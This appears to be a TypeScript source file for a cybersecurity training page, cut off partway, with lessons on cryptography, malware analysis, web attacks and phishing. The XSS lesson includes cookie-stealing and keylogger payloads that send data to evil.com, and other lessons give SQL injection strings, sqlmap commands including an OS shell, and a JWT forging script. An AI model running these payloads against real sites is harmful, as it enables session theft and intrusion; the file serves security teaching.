import { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '@/hooks/useAuth';
import DashboardLayout from '@/components/dashboard/DashboardLayout';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { Progress } from '@/components/ui/progress';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { ScrollArea } from '@/components/ui/scroll-area';
import { 
  BookOpen, Lock, Shield, Activity, Code, CheckCircle, ChevronRight, Award, 
  Play, Terminal, Eye, Lightbulb, Brain, Network, Bug, FileSearch, Server,
  AlertTriangle, Zap, Target, Cpu, Database, Globe, Key, Fingerprint,
  RefreshCw, Copy, Check, Users, Cloud, Search, Wifi, Mail, Phone,
  HardDrive, Binary, Layers, ShieldCheck, Unlock, FileCode, Wrench,
  Radar, Crosshair, Skull, Flame, Microscope, Siren, Clock, TrendingUp,
  Trophy, Star, Sparkles, GraduationCap, Bookmark, PlayCircle, PauseCircle,
  RotateCcw, ArrowRight, ChevronDown, ChevronUp, Info, ExternalLink
} from 'lucide-react';
import { toast } from 'sonner';
import { cn } from '@/lib/utils';
import { extendedModules as extendedModulesData } from '@/data/learningModulesExtended';

interface LiveLab {
  id: string;
  title: string;
  description: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced' | 'expert';
  challenge: string;
  hint: string;
  solution: string;
  validator: (input: string) => boolean;
  completed: boolean;
  points: number;
  timeEstimate: string;
  skills: string[];
}

interface Lesson {
  id: string;
  title: string;
  content: string;
  codeExample?: string;
  keyPoints?: string[];
  liveLab?: LiveLab;
  completed: boolean;
  resources?: { title: string; url: string }[];
}

interface Module {
  id: string;
  title: string;
  description: string;
  icon: typeof Lock;
  color: string;
  bgGradient: string;
  lessons: Lesson[];
  completed: boolean;
  category: 'fundamentals' | 'offensive' | 'defensive' | 'advanced';
  prerequisites?: string[];
  estimatedTime: string;
}

const LearningPage = () => {
  const { user, loading } = useAuth();
  const navigate = useNavigate();
  const [selectedModule, setSelectedModule] = useState<string | null>(null);
  const [selectedLesson, setSelectedLesson] = useState<string | null>(null);
  const [labInput, setLabInput] = useState('');
  const [labResult, setLabResult] = useState<'idle' | 'success' | 'error'>('idle');
  const [showHint, setShowHint] = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [copiedCode, setCopiedCode] = useState(false);
  const [codeOutput, setCodeOutput] = useState<string>('');
  const [isRunningCode, setIsRunningCode] = useState(false);
  const [activeCategory, setActiveCategory] = useState<string>('all');
  const [expandedContent, setExpandedContent] = useState(false);
  const [totalPoints, setTotalPoints] = useState(0);

  const [modules, setModules] = useState<Module[]>([
    // ============ FUNDAMENTALS ============
    {
      id: 'crypto',
      title: 'Cryptography Mastery',
      description: 'Master encryption algorithms, key management, and cryptographic attacks',
      icon: Lock,
      color: 'text-primary',
      bgGradient: 'from-cyan-500/20 to-blue-500/20',
      completed: false,
      category: 'fundamentals',
      estimatedTime: '4 hours',
      lessons: [
        {
          id: 'crypto-1',
          title: 'Symmetric Encryption Deep Dive',
          completed: false,
          keyPoints: [
            'AES: Block cipher modes (CBC, GCM, CTR)',
            'Key derivation functions (PBKDF2, scrypt, Argon2)',
            'IV/Nonce generation and importance',
            'Side-channel attack prevention'
          ],
          content: `SYMMETRIC ENCRYPTION IN-DEPTH

AES (Advanced Encryption Standard) is the gold standard for symmetric encryption. Understanding its modes is critical for security professionals.

BLOCK CIPHER MODES:

ECB (Electronic Codebook) - ❌ NEVER USE
• Same plaintext = same ciphertext
• Pattern leakage vulnerability
• Only for single block encryption

CBC (Cipher Block Chaining) - ⚠️ Legacy
• Each block XORed with previous ciphertext
• Requires unpredictable IV
• Vulnerable to padding oracle attacks

GCM (Galois/Counter Mode) - ✅ RECOMMENDED
• Authenticated encryption (AEAD)
• Built-in integrity check
• Parallelizable for performance
• 12-byte nonce requirement

KEY DERIVATION:
Never use passwords directly as keys!
• PBKDF2: 100,000+ iterations minimum
• Argon2id: Memory-hard, recommended for new applications
• scrypt: Memory-hard alternative`,
          codeExample: `// Secure AES-256-GCM Encryption with Web Crypto API
async function secureEncrypt(plaintext: string, password: string) {
  // Derive key from password using PBKDF2
  const encoder = new TextEncoder();
  const salt = crypto.getRandomValues(new Uint8Array(16));
  
  const keyMaterial = await crypto.subtle.importKey(
    'raw',
    encoder.encode(password),
    'PBKDF2',
    false,
    ['deriveBits', 'deriveKey']
  );
  
  const key = await crypto.subtle.deriveKey(
    {
      name: 'PBKDF2',
      salt: salt,
      iterations: 100000,
      hash: 'SHA-256'
    },
    keyMaterial,
    { name: 'AES-GCM', length: 256 },
    false,
    ['encrypt', 'decrypt']
  );
  
  // Encrypt with random IV
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const ciphertext = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv: iv },
    key,
    encoder.encode(plaintext)
  );
  
  // Return salt + iv + ciphertext
  return { salt, iv, ciphertext };
}`,
          liveLab: {
            id: 'lab-aes-advanced',
            title: 'Identify the Vulnerability',
            description: 'Analyze encryption code for security flaws',
            difficulty: 'intermediate',
            challenge: 'A developer uses AES-256 with a hardcoded IV of "0000000000000000" for all encryptions. What specific attack does this enable?',
            hint: 'When IV is reused with the same key, encrypted data can be compared...',
            solution: 'Ciphertext comparison / Pattern analysis attack',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('pattern') || lower.includes('comparison') || lower.includes('replay') || lower.includes('iv reuse');
            },
            completed: false,
            points: 50,
            timeEstimate: '10 min',
            skills: ['Cryptographic analysis', 'Vulnerability identification']
          }
        },
        {
          id: 'crypto-2',
          title: 'Public Key Infrastructure (PKI)',
          completed: false,
          keyPoints: [
            'Certificate chain validation',
            'RSA vs ECC key comparison',
            'Certificate pinning techniques',
            'MITM prevention strategies'
          ],
          content: `PUBLIC KEY INFRASTRUCTURE (PKI)

PKI is the backbone of secure internet communication. Every HTTPS connection relies on it.

CERTIFICATE HIERARCHY:
Root CA (Self-signed, Trusted)
    └── Intermediate CA (Signed by Root)
          └── End-Entity Certificate (Your server)

WHY INTERMEDIATES?
• Root keys kept offline (air-gapped)
• If intermediate compromised, revoke it
• Root remains trusted

CERTIFICATE VALIDATION:
1. Check signature chain
2. Verify not expired
3. Check revocation (CRL/OCSP)
4. Validate hostname matches
5. Verify key usage extensions

KEY ALGORITHMS COMPARISON:
┌──────────┬────────────┬────────────┐
│ Security │   RSA      │    ECC     │
├──────────┼────────────┼────────────┤
│ 112-bit  │ 2048-bit   │ 224-bit    │
│ 128-bit  │ 3072-bit   │ 256-bit    │
│ 256-bit  │ 15360-bit  │ 521-bit    │
└──────────┴────────────┴────────────┘

ECC provides same security with smaller keys!`,
          codeExample: `// Certificate Pinning in JavaScript
async function secureFetch(url: string, expectedPin: string) {
  // Get certificate info (in Node.js with TLS)
  const tls = require('tls');
  const { URL } = require('url');
  
  const { hostname, port } = new URL(url);
  
  return new Promise((resolve, reject) => {
    const socket = tls.connect({
      host: hostname,
      port: port || 443,
      servername: hostname
    }, () => {
      const cert = socket.getPeerCertificate();
      
      // Calculate pin (SHA-256 of public key)
      const crypto = require('crypto');
      const pubkey = cert.pubkey;
      const pin = crypto
        .createHash('sha256')
        .update(pubkey)
        .digest('base64');
      
      if (pin !== expectedPin) {
        reject(new Error('Certificate pin mismatch! Possible MITM attack.'));
        return;
      }
      
      console.log('Certificate pinning validated ✓');
      resolve(true);
    });
  });
}

// Usage
const EXPECTED_PIN = 'sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=';
await secureFetch('https://api.example.com', EXPECTED_PIN);`,
          liveLab: {
            id: 'lab-pki',
            title: 'Certificate Analysis',
            description: 'Identify certificate security issues',
            difficulty: 'intermediate',
            challenge: 'A certificate has: CN=*.example.com, Valid from 2020-01-01 to 2030-01-01, SHA-1 signature. Name TWO security concerns.',
            hint: 'Consider the validity period and the signature algorithm...',
            solution: '1. 10-year validity (too long), 2. SHA-1 signature (deprecated/weak)',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              const hasValidity = lower.includes('valid') || lower.includes('10 year') || lower.includes('long') || lower.includes('expir');
              const hasSha1 = lower.includes('sha-1') || lower.includes('sha1') || lower.includes('weak') || lower.includes('deprecat');
              return hasValidity || hasSha1;
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['PKI', 'Certificate analysis', 'Security assessment']
          }
        },
        {
          id: 'crypto-3',
          title: 'Hashing & Digital Signatures',
          completed: false,
          keyPoints: [
            'SHA-256/SHA-3 comparison',
            'HMAC for message authentication',
            'Digital signature workflows',
            'Hash collision attacks'
          ],
          content: `CRYPTOGRAPHIC HASHING & SIGNATURES

HASH FUNCTIONS:
One-way transformation creating fixed-size "fingerprint"

SHA-256 Properties:
• 256-bit output (64 hex characters)
• Collision resistant
• Avalanche effect (tiny change → completely different hash)
• Pre-image resistant

SHA-3 (Keccak):
• Different internal structure than SHA-2
• Resistant to length extension attacks
• Suitable for post-quantum transition

HMAC (Hash-based Message Authentication Code):
• Combines secret key with hash
• Provides integrity AND authentication
• HMAC-SHA256(key, message)

DIGITAL SIGNATURES:
1. Hash the message
2. Encrypt hash with private key
3. Attach signature to message
4. Recipient decrypts with public key
5. Compare hashes

Used for: Code signing, SSL/TLS, JWT tokens, Blockchain`,
          codeExample: `// Digital Signature with Web Crypto API
async function signMessage(privateKey: CryptoKey, message: string) {
  const encoder = new TextEncoder();
  const data = encoder.encode(message);
  
  const signature = await crypto.subtle.sign(
    {
      name: 'RSASSA-PKCS1-v1_5',
      // Or use 'RSA-PSS' for better security
    },
    privateKey,
    data
  );
  
  return new Uint8Array(signature);
}

async function verifySignature(
  publicKey: CryptoKey, 
  message: string, 
  signature: Uint8Array
) {
  const encoder = new TextEncoder();
  const data = encoder.encode(message);
  
  const isValid = await crypto.subtle.verify(
    { name: 'RSASSA-PKCS1-v1_5' },
    publicKey,
    signature,
    data
  );
  
  return isValid;
}

// JWT-style signing
function createJWT(payload: object, secret: string) {
  const header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const body = btoa(JSON.stringify(payload));
  // HMAC signature would go here
  return \`\${header}.\${body}.<signature>\`;
}`,
          liveLab: {
            id: 'lab-hash-attack',
            title: 'Hash Collision Attack',
            description: 'Understand birthday attack complexity',
            difficulty: 'advanced',
            challenge: 'MD5 has a 128-bit output. Due to the birthday paradox, how many hashes (approximately) need to be computed to find a collision? Express as 2^n',
            hint: 'Birthday attack complexity is O(2^(n/2)) where n is the hash output size in bits',
            solution: '2^64',
            validator: (input: string) => {
              const normalized = input.toLowerCase().replace(/\s/g, '');
              return normalized.includes('2^64') || normalized.includes('2**64') || normalized === '64';
            },
            completed: false,
            points: 100,
            timeEstimate: '20 min',
            skills: ['Cryptanalysis', 'Mathematical security']
          }
        }
      ]
    },
    {
      id: 'malware',
      title: 'Malware Analysis Lab',
      description: 'Reverse engineer malware samples and understand attack techniques',
      icon: Bug,
      color: 'text-destructive',
      bgGradient: 'from-red-500/20 to-orange-500/20',
      completed: false,
      category: 'offensive',
      estimatedTime: '6 hours',
      prerequisites: ['crypto'],
      lessons: [
        {
          id: 'malware-1',
          title: 'Ransomware Mechanics',
          completed: false,
          keyPoints: [
            'Hybrid encryption schemes',
            'File targeting algorithms',
            'Anti-analysis techniques',
            'C2 communication patterns'
          ],
          content: `RANSOMWARE ARCHITECTURE DEEP DIVE

MODERN RANSOMWARE COMPONENTS:

1. DROPPER / LOADER
   • Initial payload delivery
   • Downloads main ransomware
   • Often fileless (PowerShell, macros)

2. ENCRYPTION ENGINE
   Hybrid approach:
   ┌────────────────────────────────────────┐
   │ Attacker generates RSA-2048 key pair  │
   │ Public key embedded in malware        │
   │ For each victim:                      │
   │   Generate unique AES-256 key         │
   │   Encrypt files with AES              │
   │   Encrypt AES key with RSA public     │
   │   Delete original AES key             │
   └────────────────────────────────────────┘

3. FILE TARGETING
   Priority extensions:
   • Documents: .docx, .xlsx, .pdf
   • Databases: .sql, .mdb, .sqlite
   • Code: .py, .java, .cpp
   • Media: .jpg, .mp4, .psd
   
   Avoids: System files, .exe, .dll

4. PERSISTENCE
   • Registry Run keys
   • Scheduled tasks
   • Boot sector (MBR ransomware)

5. ANTI-ANALYSIS
   • VM detection
   • Debugger detection
   • Sleep timers
   • Encrypted strings`,
          codeExample: `// Simulated ransomware file targeting logic (for analysis)
class RansomwareAnalysis {
  targetExtensions = [
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.pdf', '.txt', '.jpg', '.png', '.sql', '.mdb',
    '.zip', '.rar', '.psd', '.dwg', '.xml', '.json'
  ];
  
  excludedPaths = [
    'Windows', 'Program Files', 'System32',
    'AppData\\\\Local\\\\Temp'
  ];
  
  shouldEncrypt(filePath: string): boolean {
    // Check excluded paths
    for (const excluded of this.excludedPaths) {
      if (filePath.includes(excluded)) {
        return false; // Skip system files
      }
    }
    
    // Check extension
    const ext = filePath.substring(filePath.lastIndexOf('.'));
    return this.targetExtensions.includes(ext.toLowerCase());
  }
  
  // VM Detection (what ransomware looks for)
  detectVM(): boolean {
    const indicators = [
      'VBOX', 'VMWARE', 'VIRTUAL', 'QEMU',
      'XEN', 'HYPERV', 'PARALLELS'
    ];
    
    // Check registry, processes, files
    // Real malware would check multiple sources
    return false; // Simplified
  }
}`,
          liveLab: {
            id: 'lab-ransom-analysis',
            title: 'Ransomware Identification',
            description: 'Analyze ransomware behavior patterns',
            difficulty: 'intermediate',
            challenge: 'You observe: 1) PowerShell downloading file, 2) vssadmin deleting shadows, 3) Files renamed to .locked, 4) Tor connection. What phase is "vssadmin delete shadows"?',
            hint: 'This command removes Windows restore points and volume shadow copies...',
            solution: 'Preparation / Pre-encryption / Defense evasion',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('prep') || lower.includes('pre-encrypt') || lower.includes('defense') || lower.includes('evas') || lower.includes('before');
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['Malware analysis', 'Threat hunting']
          }
        },
        {
          id: 'malware-2',
          title: 'Static Analysis Mastery',
          completed: false,
          keyPoints: [
            'PE file structure analysis',
            'Import Address Table (IAT)',
            'String extraction techniques',
            'YARA rule creation'
          ],
          content: `STATIC MALWARE ANALYSIS

Examine malware WITHOUT executing it.

PE FILE STRUCTURE:
┌─────────────────────────────────┐
│ DOS Header (MZ signature)       │
├─────────────────────────────────┤
│ PE Header (PE signature)        │
├─────────────────────────────────┤
│ Optional Header                 │
│  - Entry point                  │
│  - Image base                   │
│  - Section alignment            │
├─────────────────────────────────┤
│ Section Headers                 │
│  .text (code)                   │
│  .data (initialized data)       │
│  .rdata (read-only data)        │
│  .rsrc (resources)              │
└─────────────────────────────────┘

IMPORT ANALYSIS:
Suspicious imports indicate behavior:
• CreateRemoteThread → Process injection
• VirtualAllocEx → Memory manipulation
• CryptEncrypt → Encryption capability
• InternetOpen → Network communication
• RegSetValue → Registry modification

STRING EXTRACTION:
• IP addresses, URLs
• Ransom note text
• Registry paths
• Mutex names (prevent re-infection)

ENTROPY ANALYSIS:
• High entropy (>7) = packed/encrypted
• Normal code = 5-6 entropy
• Use to detect obfuscation`,
          codeExample: `# YARA Rule for Ransomware Detection
rule Ransomware_Generic {
    meta:
        description = "Detects generic ransomware behavior"
        author = "Security Analyst"
        severity = "critical"
    
    strings:
        // Ransom note patterns
        $note1 = "Your files have been encrypted" nocase
        $note2 = "Bitcoin" nocase
        $note3 = "decrypt" nocase
        $note4 = ".onion" nocase
        
        // Crypto API imports
        $crypto1 = "CryptEncrypt"
        $crypto2 = "CryptGenKey"
        $crypto3 = "CryptImportKey"
        
        // Shadow copy deletion
        $shadow1 = "vssadmin" nocase
        $shadow2 = "delete shadows" nocase
        $shadow3 = "wmic shadowcopy" nocase
        
        // Common extensions
        $ext1 = ".locked"
        $ext2 = ".encrypted"
        $ext3 = ".cry"
        
    condition:
        uint16(0) == 0x5A4D and // MZ header
        (
            (2 of ($note*)) or
            (2 of ($crypto*) and 1 of ($shadow*)) or
            (1 of ($shadow*) and 1 of ($ext*))
        )
}`,
          liveLab: {
            id: 'lab-pe-analysis',
            title: 'PE Header Analysis',
            description: 'Extract malware indicators from PE file',
            difficulty: 'advanced',
            challenge: 'A PE file imports: CreateRemoteThread, WriteProcessMemory, VirtualAllocEx. What attack technique do these imports suggest?',
            hint: 'These APIs are used to execute code in another process...',
            solution: 'Process injection / DLL injection',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('injection') || lower.includes('inject') || lower.includes('hollowing');
            },
            completed: false,
            points: 100,
            timeEstimate: '20 min',
            skills: ['PE analysis', 'Reverse engineering', 'YARA rules']
          }
        },
        {
          id: 'malware-3',
          title: 'Dynamic Analysis Sandbox',
          completed: false,
          keyPoints: [
            'Sandbox environment setup',
            'API call monitoring',
            'Network traffic capture',
            'Behavioral indicators extraction'
          ],
          content: `DYNAMIC MALWARE ANALYSIS

Execute malware in controlled environment to observe behavior.

SANDBOX REQUIREMENTS:
✓ Isolated network (no internet or controlled)
✓ Snapshot capability
✓ API monitoring tools
✓ Network capture (Wireshark)
✓ File system monitoring
✓ Registry monitoring

TOOLS:
• Cuckoo Sandbox (automated)
• Any.Run (cloud-based, interactive)
• Process Monitor (Sysinternals)
• Wireshark / NetworkMiner
• Regshot (registry diff)

BEHAVIORAL INDICATORS:
┌────────────────────────────────────────┐
│ Category    │ Indicators              │
├─────────────┼─────────────────────────┤
│ Persistence │ Registry Run keys       │
│             │ Scheduled tasks         │
│             │ Service installation    │
├─────────────┼─────────────────────────┤
│ Defense     │ Disable AV              │
│ Evasion     │ Clear event logs        │
│             │ Timestomping            │
├─────────────┼─────────────────────────┤
│ Collection  │ Keylogging              │
│             │ Screenshot capture      │
│             │ Clipboard monitoring    │
├─────────────┼─────────────────────────┤
│ Exfil       │ DNS tunneling           │
│             │ HTTP POST               │
│             │ Cloud storage APIs      │
└─────────────┴─────────────────────────┘

ANTI-SANDBOX TECHNIQUES:
• Check for VirtualBox/VMware artifacts
• Mouse movement detection
• Screen resolution checks
• Time bomb (delay execution)`,
          codeExample: `# Cuckoo Sandbox Analysis Report Parser
import json

def analyze_cuckoo_report(report_path: str):
    with open(report_path) as f:
        report = json.load(f)
    
    findings = {
        'malicious_indicators': [],
        'network_iocs': [],
        'file_operations': [],
        'registry_changes': []
    }
    
    # Extract network IOCs
    if 'network' in report:
        for dns in report['network'].get('dns', []):
            findings['network_iocs'].append({
                'type': 'dns',
                'value': dns['request'],
                'answer': dns.get('answers', [])
            })
        
        for http in report['network'].get('http', []):
            findings['network_iocs'].append({
                'type': 'http',
                'method': http['method'],
                'uri': http['uri'],
                'host': http['host']
            })
    
    # Check for suspicious behavior
    behavior = report.get('behavior', {})
    
    # Persistence mechanisms
    for reg in behavior.get('regkey_written', []):
        if 'Run' in reg or 'Services' in reg:
            findings['malicious_indicators'].append(
                f'Persistence via registry: {reg}'
            )
    
    # Shadow copy deletion
    for cmd in behavior.get('command_line', []):
        if 'vssadmin' in cmd.lower() or 'wmic shadowcopy' in cmd.lower():
            findings['malicious_indicators'].append(
                f'Shadow copy deletion: {cmd}'
            )
    
    return findings`
        }
      ]
    },
    // ============ OFFENSIVE SECURITY ============
    {
      id: 'webapp-security',
      title: 'Web Application Attacks',
      description: 'OWASP Top 10, SQL injection, XSS, and web exploitation',
      icon: Globe,
      color: 'text-orange-500',
      bgGradient: 'from-orange-500/20 to-yellow-500/20',
      completed: false,
      category: 'offensive',
      estimatedTime: '8 hours',
      lessons: [
        {
          id: 'web-1',
          title: 'SQL Injection Mastery',
          completed: false,
          keyPoints: [
            'Union-based injection',
            'Blind SQL injection',
            'Time-based techniques',
            'Automated exploitation with SQLMap'
          ],
          content: `SQL INJECTION DEEP DIVE

SQL injection occurs when user input is incorporated into SQL queries without proper sanitization.

INJECTION TYPES:

1. IN-BAND (Classic)
   Union-based: Combine results with another query
   Error-based: Extract data from error messages

2. BLIND
   Boolean-based: True/false responses
   Time-based: Delays indicate success

3. OUT-OF-BAND
   DNS/HTTP exfiltration when no direct output

EXPLOITATION WORKFLOW:
1. Identify injection point
2. Determine database type
3. Enumerate databases/tables
4. Extract data
5. Privilege escalation

PAYLOADS:
-- Authentication bypass
' OR '1'='1' --
' OR 1=1 --
admin'--

-- Union-based enumeration
' UNION SELECT 1,2,3 --
' UNION SELECT null,username,password FROM users --

-- Blind boolean
' AND (SELECT SUBSTRING(username,1,1) FROM users)='a' --

-- Time-based blind
' AND SLEEP(5) --
'; WAITFOR DELAY '0:0:5' --`,
          codeExample: `# SQLMap Cheatsheet
# Basic injection test
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump table contents  
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# POST parameter injection
sqlmap -u "http://target.com/login" --data="username=admin&password=test" -p username

# Cookie-based injection
sqlmap -u "http://target.com/page" --cookie="session=abc123" --level=2

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between

# Get OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# Prevention: Parameterized Queries (Python)
import sqlite3
conn = sqlite3.connect('database.db')
cursor = conn.cursor()

# VULNERABLE ❌
user_input = "'; DROP TABLE users; --"
cursor.execute(f"SELECT * FROM users WHERE id = '{user_input}'")

# SECURE ✓
cursor.execute("SELECT * FROM users WHERE id = ?", (user_input,))`,
          liveLab: {
            id: 'lab-sqli',
            title: 'Craft SQL Injection',
            description: 'Build a working injection payload',
            difficulty: 'intermediate',
            challenge: 'Login form query: SELECT * FROM users WHERE username=\'$user\' AND password=\'$pass\'. Craft a username that bypasses authentication (password can be anything).',
            hint: 'You need to make the WHERE clause always true and comment out the password check...',
            solution: "admin'-- or ' OR '1'='1'--",
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes("'") && lower.includes("--")) || 
                     (lower.includes("or") && lower.includes("1=1")) ||
                     (lower.includes("or") && lower.includes("'1'='1'"));
            },
            completed: false,
            points: 100,
            timeEstimate: '25 min',
            skills: ['SQL injection', 'Web exploitation', 'Authentication bypass']
          }
        },
        {
          id: 'web-2',
          title: 'Cross-Site Scripting (XSS)',
          completed: false,
          keyPoints: [
            'Reflected vs Stored vs DOM XSS',
            'Cookie theft techniques',
            'XSS filter bypass',
            'Content Security Policy'
          ],
          content: `CROSS-SITE SCRIPTING (XSS)

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

XSS TYPES:

1. REFLECTED XSS
   • Payload in URL/request
   • Reflected back in response
   • Requires victim to click link

2. STORED XSS
   • Payload saved in database
   • Executed when page loaded
   • Higher impact (affects all users)

3. DOM-BASED XSS
   • Client-side vulnerability
   • Never reaches server
   • Harder to detect

EXPLOITATION GOALS:
• Session hijacking (steal cookies)
• Keylogging
• Phishing (fake login forms)
• Malware distribution
• Defacement

COMMON PAYLOADS:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
"><script>alert('XSS')</script>
javascript:alert('XSS')

FILTER BYPASS:
<ScRiPt>alert('XSS')</ScRiPt>          // Case variation
<scr<script>ipt>alert('XSS')</script>  // Nested tags
<img src=x onerror="alert('XSS')">     // Event handlers
<svg/onload=alert('XSS')>              // No space`,
          codeExample: `// Cookie Stealing Payload
// Attacker hosts this on evil.com
<script>
  new Image().src = "https://evil.com/steal?c=" + document.cookie;
</script>

// Keylogger Payload
<script>
document.onkeypress = function(e) {
  new Image().src = "https://evil.com/log?k=" + e.key;
}
</script>

// Session Hijacking with Fetch
<script>
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    url: window.location.href,
    localStorage: JSON.stringify(localStorage)
  })
});
</script>

// Prevention: Output Encoding
function escapeHtml(text: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// Content Security Policy Header
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'`,
          liveLab: {
            id: 'lab-xss',
            title: 'XSS Filter Bypass',
            description: 'Bypass a basic XSS filter',
            difficulty: 'advanced',
            challenge: 'A filter removes <script> tags. Create an XSS payload that executes JavaScript without using <script> tags.',
            hint: 'Many HTML elements have event handlers like onerror, onload, onclick...',
            solution: '<img src=x onerror=alert(1)> or <svg onload=alert(1)>',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('onerror') || lower.includes('onload') || lower.includes('onclick') || lower.includes('onmouseover')) && 
                     !lower.includes('<script');
            },
            completed: false,
            points: 100,
            timeEstimate: '20 min',
            skills: ['XSS exploitation', 'Filter bypass', 'Web security']
          }
        },
        {
          id: 'web-3',
          title: 'Authentication & Session Attacks',
          completed: false,
          keyPoints: [
            'Session fixation attacks',
            'JWT vulnerabilities',
            'OAuth security flaws',
            'Password reset exploits'
          ],
          content: `AUTHENTICATION & SESSION ATTACKS

SESSION HIJACKING:
• Steal session cookie via XSS
• Man-in-the-Middle (if not HTTPS)
• Session fixation (force known session ID)

SESSION FIXATION:
1. Attacker gets session ID from site
2. Tricks victim into using that ID
3. Victim authenticates
4. Attacker uses same session (now authenticated)

Prevention: Regenerate session ID after login

JWT VULNERABILITIES:

1. Algorithm Confusion
   • Change "alg" from RS256 to HS256
   • Sign with public key (thinking it's secret)

2. None Algorithm
   • Set "alg" to "none"
   • Remove signature

3. Weak Secrets
   • Brute-force HMAC secret
   • Common: "secret", "password123"

4. Key Injection
   • Include public key in "jku" header
   • Point to attacker-controlled URL

OAUTH MISCONFIGURATIONS:
• Open redirect in redirect_uri
• Missing state parameter (CSRF)
• Token leakage in referrer
• Insufficient redirect_uri validation`,
          codeExample: `// JWT Algorithm Confusion Attack
const jwt = require('jsonwebtoken');
const fs = require('fs');

// Original RS256 token
const originalToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...';

// Get the public key (usually publicly available)
const publicKey = fs.readFileSync('public.pem');

// Decode the token to get payload
const decoded = jwt.decode(originalToken);

// Create new token with HS256, signing with public key
const forgedToken = jwt.sign(
  decoded,
  publicKey,  // Using public key as HMAC secret!
  { algorithm: 'HS256' }
);

// If server accepts both RS256 and HS256, this works

// Prevention: Verify algorithm explicitly
jwt.verify(token, publicKey, { algorithms: ['RS256'] });

// Secure JWT Implementation
const crypto = require('crypto');

function createSecureJWT(payload: object) {
  const secret = crypto.randomBytes(64).toString('hex');
  
  return jwt.sign(payload, secret, {
    algorithm: 'HS256',
    expiresIn: '15m',  // Short expiry
    issuer: 'your-app',
    audience: 'your-api'
  });
}`,
          liveLab: {
            id: 'lab-jwt',
            title: 'JWT Attack',
            description: 'Identify JWT vulnerability',
            difficulty: 'advanced',
            challenge: 'A JWT header is: {"alg":"HS256","typ":"JWT"}. The secret is "secret123". What type of attack could recover this secret?',
            hint: 'If the secret is weak, you can try common passwords...',
            solution: 'Brute force / Dictionary attack',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('brute') || lower.includes('dictionary') || lower.includes('crack') || lower.includes('guess');
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['JWT security', 'Authentication attacks']
          }
        }
      ]
    },
    {
      id: 'social-engineering',
      title: 'Social Engineering',
      description: 'Human-focused attacks: phishing, pretexting, and manipulation',
      icon: Users,
      color: 'text-pink-500',
      bgGradient: 'from-pink-500/20 to-purple-500/20',
      completed: false,
      category: 'offensive',
      estimatedTime: '3 hours',
      lessons: [
        {
          id: 'se-1',
          title: 'Phishing Attack Design',
          completed: false,
          keyPoints: [
            'Email header spoofing',
            'Domain impersonation',
            'Credential harvesting pages',
            'Payload delivery methods'
          ],
          content: `PHISHING ATTACK METHODOLOGY

PHASES OF PHISHING ATTACK:

1. RECONNAISSANCE
   • Target organization research
   • Employee email patterns
   • Technology stack identification
   • Social media intelligence (OSINT)

2. INFRASTRUCTURE SETUP
   • Domain registration (typosquatting)
   • SSL certificate acquisition
   • Email server configuration
   • Landing page development

3. PRETEXT DEVELOPMENT
   High success scenarios:
   • IT security alerts
   • Password expiration
   • CEO/CFO wire transfer (BEC)
   • Shipping notifications
   • HR policy updates

4. DELIVERY
   • Spear phishing (targeted)
   • Whaling (executives)
   • Smishing (SMS)
   • Vishing (voice)

TYPOSQUATTING EXAMPLES:
• microsoft.com → micr0soft.com
• paypal.com → paypa1.com
• amazon.com → amaz0n.com
• google.com → g00gle.com

EMAIL SPOOFING CHECKS:
• SPF (Sender Policy Framework)
• DKIM (DomainKeys Identified Mail)
• DMARC (Domain-based Authentication)`,
          codeExample: `# Phishing Email Header Analysis
# Look for these red flags in email headers:

# 1. Check Return-Path vs From
Return-Path: <attacker@evil.com>
From: "IT Support" <support@company.com>  # SPOOFED!

# 2. Check Received headers (bottom to top)
Received: from evil-server.com (192.168.1.100)
  by mail.company.com  # First hop reveals origin

# 3. SPF Result
Authentication-Results: spf=fail (sender IP not authorized)

# 4. DKIM Signature
DKIM-Signature: v=1; a=rsa-sha256; d=evil.com  # Wrong domain!

# Python: Extract email headers for analysis
import email
from email import policy

def analyze_email(raw_email: str):
    msg = email.message_from_string(raw_email, policy=policy.default)
    
    analysis = {
        'from': msg['From'],
        'return_path': msg['Return-Path'],
        'received': msg.get_all('Received'),
        'authentication_results': msg['Authentication-Results'],
        'spf': 'pass' if 'spf=pass' in str(msg['Authentication-Results']) else 'fail',
